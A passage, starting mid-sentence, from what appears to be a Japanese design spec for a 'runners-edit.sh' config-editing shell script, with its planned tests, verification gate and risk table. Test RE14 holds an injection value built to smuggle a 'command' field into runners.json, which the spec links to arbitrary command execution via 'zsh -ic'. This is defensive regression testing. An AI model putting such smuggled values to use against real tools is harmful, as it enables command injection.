無条件の「2 スクリプトを通る」は `--reset` について偽になる）。

#### 3.2 言語規則と既存テストの保護

**言語**: `SKILL.md` と `references/` 配下の `*-ja.md` でないファイルには日本語を
1 文字も書かない。`README.md` / `CLAUDE.md` / `*-ja.md` は日本語。
`node scripts/check-doc-lang.mjs` が硬いゲートとして効く。
**`runners-edit.sh` のコメントは日本語**（ルート / プラグイン CLAUDE.md の規約、
`config-edit.sh` の全コメントと同じ。`check-doc-lang.mjs` は `.sh` を見ないので
機械的には落ちない分、明記しておく）。

**既存テストが grep する文字列を壊さない**:

- `test-setup-skill.sh` の SU5 は **2 ブロック・計 10 個**の文字列を `setup-mode.md` の
  平坦化テキストから探す。すべて温存する。
  - 書き込み契約 7 個: `merges instead of replacing` / `shell_ready_ms` /
    `writer-specific` / `mktemp "$CONFIG.XXXXXX"` / `only when jq succeeded` /
    `single atomic move` / `Never hand-assemble a jq invocation`
  - 三値セマンティクス 3 個: `a fixed value` / `the key absent` /
    `persistence options stay hidden`（三値セマンティクス節は今回**触らない**）
- SU1 は `SKILL.md` に `scripts/config-edit.sh` があることを求める。**温存する。**
- SU8 は `setup-mode.md` と `setup-mode-ja.md` の H1-H3 見出し数の一致を求める
  （現在**英日とも 18 個**）。`### S3-M` を両方へ足して 19 個ずつにする。下位見出しを
  `####` にするのはこのため。
- `## All writes go through` は `setup-mode.md:47` 以外から参照されていないことを
  確認済み。改題は安全。

---

### 4. テスト

#### 4.1 新規 `test/test-runners-edit.sh`（動的ユニットテスト）

`test-config-edit.sh` と同型。実際に一時ディレクトリへ `runners.json` を作り、
スクリプトを実行して結果を検証する。

| id | 不変条件 |
|---|---|
| RE1 | `--set` が指定 runner のフィールドだけを更新し、他 runner と `default` を変えない |
| RE2 | allowlist 外のフィールド名（`engine` / `name` / `default` / 綴り違い）は exit 2 |
| RE3 | engine 別 effort allowlist。**負**: claude runner に `minimal`、codex runner に `max` はどちらも exit 2。**正のコントロール**: claude×`max` / claude×`low` / codex×`minimal` / codex×`xhigh` は exit 0 で実際に書き込まれる（`test-config-edit.sh` CE6 が正負の両半分を持つのに倣う。これが無いと allowlist の綴り間違いで全 effort が常に exit 2 になる実装でも緑になる） |
| RE4 | model はモデル名を allowlist しない: `[A-Za-z0-9._\[\]/-]` からなる任意の未知文字列が通る。**空値は exit 2**。**シェルメタ文字（`'` `"` `` ` `` `$` `\`）と制御文字を含む値は exit 2** |
| RE5 | `--unset` が該当フィールドだけを削除し、同レコードの他フィールドを残す。**不在フィールドへの `--unset` は exit 0（冪等）** |
| RE6 | 未知の `--name` は exit 2 かつファイル無変更 |
| RE7 | 複数の `--set` / `--unset` が 1 回の呼び出しでまとめて反映される |
| RE8 | 壊れた JSON では exit 1 かつ元ファイルを破壊しない |
| RE9 | temp の残骸が**全パス**で残らない: 成功 / jq 失敗 exit 1 / effort 検証エラー exit 2 / 未知 `--name` exit 2 / `mv` 失敗（read-only 親ディレクトリ。先例は `test-send-prompt.sh` の `$TMP/ro-parent`） |
| RE10 | `--get` / `--show` は非破壊。未設定フィールドは空文字で exit 0。**ファイル不在時も `--get` は空 + exit 0、`--show` は `{}` + exit 0** |
| RE11 | 引数エラー: モードの同時指定 / モード未指定 / `--runners` 未指定 / **`--set` を `--name` 無しで呼ぶ** / 同一フィールドへの `--set` と `--unset` の同時指定 — すべて exit 2（`test-config-edit.sh` CE11 が同時指定 + 未指定 + `--config` 未指定を見るのに倣い、`--name` 必須という新しい条件を足す） |
| RE12 | 編集対象レコード内の allowlist 外フィールドが生存する（置換ではなくマージ） |
| RE13 | **書き込みモードで** `--runners` が存在しないファイルを指すと exit 2（レジストリを新規作成しない）。読み取りモードの不在は RE10 |
| RE14 | **注入回帰**: `--set 'plan_model=a", "command": "pwned'` を実行し、(a) `.plan_model` が入力バイト列と完全一致で往復するか exit 2 で拒否されるかのどちらかであること、(b) 同レコードの `.command` / `.engine` / `.name` が不変、(c) 他 runner と `default` が不変。RE1 / RE12 は正常系の写像しか見ないので代替にならない |
| RE15 | `.runners` 欠落 / `null` / 非配列（オブジェクト）に対して非 0 で終了し、ファイルを変更しない。特にオブジェクトが配列へ化けないこと |
| RE16 | `--name` が 2 件一致する（重複 name）レジストリでは exit 2 かつファイル無変更 |
| RE17 | `engine` 欠落レコード / `engine: gemini` に `--set plan_effort=high` → exit 2 かつファイル無変更（§1.1 が「新規スクリプトにしかできない」と位置づけた検証の根幹） |
| RE18 | `--dry-run` は stdout へ適用後 JSON を出し、**ファイルを変更しない**。`--get` / `--show` との併用は exit 2 |

#### 4.2 `test/test-setup-skill.sh` の拡張（SU10〜SU15）

既存の SU1〜SU9 は変更しない。冒頭の必須ファイルリスト（現在 5 ファイル）に
`runners-edit.sh` を足し、SU12 / SU13 のアサーションを同じ担保の内側に置く。

| id | 不変条件 |
|---|---|
| SU10 | `setup-mode.md` が S3 の 4 択と `S3-M` を、6 フィールド名すべてとともに記載している |
| SU11 | `setup-mode.md` が `runners-edit.sh` と、その原子的書き込み契約を記載している。**加えて「ファイル未存在なら exit 2、新規作成は First-run setup の担当」の旨**（§3.1 の限定文言）を含む |
| SU12 | codex effort 選択肢に `max` が現れない。**正アンカー + 負アサーションのペア**（下記） |
| SU13 | `SKILL.md` と `references/guide-ja.md` の両方が `runners-edit.sh` に言及している |
| SU14 | `runners-edit.sh` が存在し実行可能で、引数なしで usage を出して exit 2。**加えて usage に現れる long flag（`--runners` / `--name` / `--set` / `--unset` / `--get` / `--show` / `--dry-run`）がすべて `setup-mode.md` の記述にも現れる**（doc と実 I/F の整合。これが無いと doc が実在しないフラグを書いていても SU11 と RE 群の両方が緑になり、S3-M / S7 をコピーする LLM が実害を踏む） |
| SU15 | `setup-mode-ja.md` にも SU10 相当の needle（6 フィールド名 + `S3-M`）が現れる。SU8 は見出し**数**しか見ないので、日本語版の S3-M が空でも緑になる穴を塞ぐ |

**SU12 の書き方**（重要）: `setup-mode.md` / `setup-mode-ja.md` には
**claude 行に正当な `max` が現れる**ので、素の `grep -q max` では必ず FAIL する。
一方、行スコープの否定 grep（`grep '^| codex' | grep -q max` 相当）は
**アンカー行が消えた瞬間に 0 ヒットで黙って通る**。したがって:

1. まず「codex の effort 候補プールを記述した行が N 行以上存在する」ことを
   **正のアンカーとして assert** する。
2. **その行集合に対してのみ** `max` が無いことを assert する。
3. 対象ファイルが読めない場合と grep が status ≥ 2 を返す場合を **FAIL** にする
   （fail-open を禁じる）。先例は `test-send-prompt-callsites.sh` の CS1 で、
   ルート `CLAUDE.md` 保守手順 9 に規約として明文化されている。

この依存があるため、§3 の同期表に「`setup-mode.md` は SU12 が依存する行形式を
維持する義務がある」を含めてある。

#### 4.3 テストに関する注意と、自動テストの限界

- 追加する 2 つのテストは **`prewarm-panes.sh` を一切呼ばない**。したがって
  「`prewarm-panes.sh` を呼ぶテストは先に worktree ディレクトリを `mkdir -p` する」
  という**直近の設計書で確立された実践**（`docs/superpowers/specs/2026-08-18-…` /
  `2026-08-19-…` と本タスクのプロンプトにある。CLAUDE.md には未明文化）に抵触する
  箇所は生じない。実装時にうっかり `prewarm-panes.sh` を呼ぶテストを足さないこと。
- シェルスクリプトは **bash 3.2 互換**（macOS 既定）。`set -u` 下で空になりうる配列を
  展開するときは `${arr[@]+"${arr[@]}"}` を使う。`config-edit.sh` の `JQ_ARGS` が
  まさにこの形。連想配列（bash 4+）は使わない。
- **自動テストの対象外を明示する。** M1 / M2 / M3 の質問構成、「第 1 選択肢は常に
  変更なし」、engine 別候補生成、codex 候補が空のときのフォールバック、"Other" の
  再質問、S6 への警告持ち越し、S7 の 2 コール順序と非トランザクション性 — これらは
  すべて md を読む LLM の挙動で、SU10-15 の grep では担保されない。リポジトリの先例
  （`test-loop-skill.sh` / `test-setup-skill.sh` / CS3）も grep 止まりなので方針としては
  整合するが、**限界を認めたうえで** CLAUDE.md「テスト方法」E2E 項目 43 に S3-M の
  ケースを追記し、人手で確認する（§3 の同期表に含めてある）。

---

## 検証ゲート

worktree ルートから次をすべて実行し、全スイートが通ること。

```bash
cd "$(git rev-parse --show-toplevel)/apps/cmux-team-dispatch-task"
fail=0
for t in test/*.sh; do
  printf '%-46s ' "$t"
  if bash "$t" >/dev/null 2>&1; then echo OK; else echo FAILED; fail=1; fi
done
cd "$(git rev-parse --show-toplevel)" && pnpm check || fail=1
exit "$fail"
```

`check-doc-lang` が OK を出すこと。`@tanaka-yui/token-meter` の
`noNonNullAssertion` 警告 4 件は既知のノイズで失敗ではない（`biome check` は
warning では exit 0 のまま）。

> `git rev-parse --show-toplevel` は worktree ルートを返す。タスクプロンプトの
> ゲートはメインリポジトリの絶対パスを指しているが、**検証すべきは worktree の
> 変更なのでこれは意図的な訂正**である。

テスト実行後、残骸が無いことを確認する。既知パターンだけを見るのではなく、
テスト前後の diff を取る。

```bash
git worktree list  > /tmp/wt.before ; git branch --list > /tmp/br.before
# ... run tests ...
git worktree list  > /tmp/wt.after  ; git branch --list > /tmp/br.after
diff /tmp/wt.before /tmp/wt.after && diff /tmp/br.before /tmp/br.after
```

## タスク指示からの意図的な逸脱

タスク指示は「**Model strings are NOT validated.** Offer the common claude aliases
… but let any string through.」と述べている。本設計はこの意図（**モデル名の
allowlist を作らない** = 新しいモデル名がそのまま通る）を守るが、
**シェルメタ文字と制御文字だけは拒否する**（§1.3 / §1.3.1）。

理由: `--setup` は値を `runners.json` へ永続化し、それが `zsh -ic "… --model '<v>' …"`
の二重引用の内側で以後の全ディスパッチにわたって再実行されるため。拒否する文字は
実在・将来のモデル名に現れない。同種の防御はルート `CLAUDE.md` 保守手順 27 と
`test-parallel-directive.sh` PD4 に先例がある。

この逸脱を採らない判断もありうる（タスク指示に厳密に従い、無検証で通す）。その場合は
§1.3 の 2 番目の条件と RE4 の該当アサーションを落とせばよく、他の設計は変わらない。

## 明示的に採らなかった対策

| 案 | 不採用の理由 |
|---|---|
| S7 に並行書き込みガード（書き込み直前に 6 フィールドを `--get` で読み直し、S1 表示と違えば中止） | `config.json` は同じ last-write-wins 特性を**文書化しているだけ**（CLAUDE.md 項目 19）。新スクリプトにだけガードを入れると 2 つの edit スクリプトが非対称になり、「ユーザーが求めた書き込みを中止する」という新しい失敗モードが増える。窓は S1 表示後に別ペインが `--reset runners` を走らせた場合に限られ、狭い。**文書化のみ**とする |
| `runners.json` の symlink を `pwd -P` で解決してから書く | `config-edit.sh` は解決しない。片方だけ挙動を変えると非対称になる。**§1.4 に既存挙動として明記するのみ** |
| First-run setup を `runners-edit.sh` 経由に統一 | 非目標。回帰リスクだけが増え、§1.5 の exit 2 と衝突する |
| First-run setup / `--override` の model 自由入力にも §1.3.1 の防御を入れる | 非目標（既存経路の変更）。§1.3.1 に既知の限界として明記する |

## リスクと対処

| リスク | 対処 |
|---|---|
| `setup-mode.md` の改題で SU5 の grep 対象が消える | 改題するのは見出しだけ。SU5 が探す **10 個**の文字列は本文にあるので本文を消さない。三値セマンティクス節は触らない |
| 英日の見出し数がずれて SU8 が落ちる | `### S3-M` を両ファイルへ同時に足し、下位見出しは英日とも `####`。SU8 がそのまま検知する |
| `SKILL.md` に日本語が混入する | `pnpm check:doc-lang` が硬いゲート。`pnpm check` にも組み込み済み |
| codex に `max` が漏れる | ドキュメント側は SU12（正アンカー + 負アサーション）、スクリプト側は RE3 の負・正両方。**2 層で守る** |
| `runners-edit.sh` の jq 式が対象外の runner / フィールドを壊す | RE1 / RE12 / RE14 / RE15 / RE16 |
| 値補間実装による `.command` 書き換え → `zsh -ic` 経由の任意コマンド実行 | §1.4 の `--arg` 契約を明文化 + RE14 |
| codex `review_model` の unset で次回ディスパッチが `die` | §2.4 の 3 段防御（S1 表示 / 選択肢 description / S6 警告） |
| 検証エラー時に temp が残る | §1.4 の「検証はすべて `mktemp` より前」+ `trap` + RE9 の 5 パス |
| doc 同期漏れ | §3 を**節単位**で列挙（guide-ja.md は 3 箇所、CLAUDE.md は 4 箇所） |
| 6 フィールドが 1 コールに収まらない | M2 / M3 の 2 コールに分割済み。各 3 問 × 4 選択肢で上限内 |
| 選択肢が実効同値で埋まる | 静的表を廃し、現在値と実効既定値を除外する動的規則にした |
